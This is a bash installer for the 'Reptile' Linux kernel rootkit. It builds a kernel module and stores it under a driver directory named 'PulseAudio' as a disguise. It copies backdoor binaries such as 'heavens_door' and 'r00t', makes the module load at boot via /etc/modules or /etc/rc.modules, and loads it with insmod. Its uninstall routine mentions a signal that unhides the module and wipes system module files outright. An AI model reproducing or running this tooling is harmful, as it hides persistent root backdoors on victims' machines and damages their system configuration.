#!/bin/bash
#
# Reptile Install Script
# Author: F0rb1dd3n

MODULE="reptile_mod"
DRIVER="PulseAudio"
KERNEL_VERSION=$(uname -r)
DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"

function usage {
	echo -e "\n\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
	echo -e "\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;36mwriten by: F0rb1dd3n\e[00m\n"
	echo -e "Usage: $0 <arg>\n"
	echo -e "\tbuild\t\tCompile the module"
	echo -e "\tinstall\t\tCompile and install the module persistently"
	echo -e "\tremove\t\tRemove the persistence of module\n"
}

function reptile_build {
	echo -e "\n\e[00;31m############################### \e[01;36mBuilding...\e[00;31m ################################\e[00m\n"
	make all

	echo -e "\n\e[00;31m############################### \e[01;36mCleanning...\e[00;31m ###############################\e[00m\n" 
	make clean

	mv bin/reptile_mod bin/reptile_mod.ko
}

function reptile_cpy {
	mkdir -p /reptile
	
	echo -e "\n\e[00;31m############################# \e[01;36mCopying files...\e[00;31m #############################\e[00m\n" 
	
	cp bin/reptile_mod.ko /reptile/reptile_mod.ko
	cp bin/heavens_door /reptile
	cp bin/r00t /reptile
	cp bin/knock_on_heaven /reptile
	cp scripts/kill_door.sh /reptile
	cp scripts/start.sh /reptile
	rm -rf bin
	echo -e "\e[01;36mAll binaries was copied to /reptile\e[00m"
}


function reptile_install {
    	reptile_build
    	reptile_cpy

    	echo -e "\n\e[00;31m############################## \e[01;36mInstalling...\e[00;31m ###############################\e[00m"
    
    	if [ ! -d $DRIVER_DIRECTORY ]; then
        	mkdir -p $DRIVER_DIRECTORY
    	fi

    	cp "$PWD/bin/$MODULE.ko" "$DRIVER_DIRECTORY"
    
    	for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
       	do 
            	SYSTEM=${f:5:${#f}-13}
    	done

    	if [ "$SYSTEM" == "" ]; then
        	#TODO: error message
        	exit
    	fi

    	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules
    	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/rc.modules
        	chmod +x /etc/rc.modules
    	fi
    	depmod
    	insmod /reptile/$MODULE.ko
}

function reptile_uninstall {
	echo -e "\n\e[01;31mBe sure to unhide and unload the module or this script will not work properly!\e[00m"
	echo -e "Command: \e[01;32mkill -50 0 && rmmod reptile_mod\e[00m\n"
    	echo -e "\e[00;31m############################# \e[01;36mUninstalling...\e[00;31m ##############################\e[00m\n"
	#kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'`
	rm -rf /reptile
	rm -rf $DRIVER_DIRECTORY
	rm -rf /etc/rc.modules
	echo '' > /etc/modules
	depmod
}

case $1 in
	build)
		reptile_build
		echo -e "\n\e[01;36mDONE!\e[00m\n"
		;;
    	install)
        	reptile_install
		echo -e "\n\e[01;36mDONE!\e[00m\n"
        	;;
    	uninstall)
        	reptile_uninstall
		echo -e "\n\e[01;36mDONE!\e[00m\n"
        	;;
	"")
		usage
		;;
esac
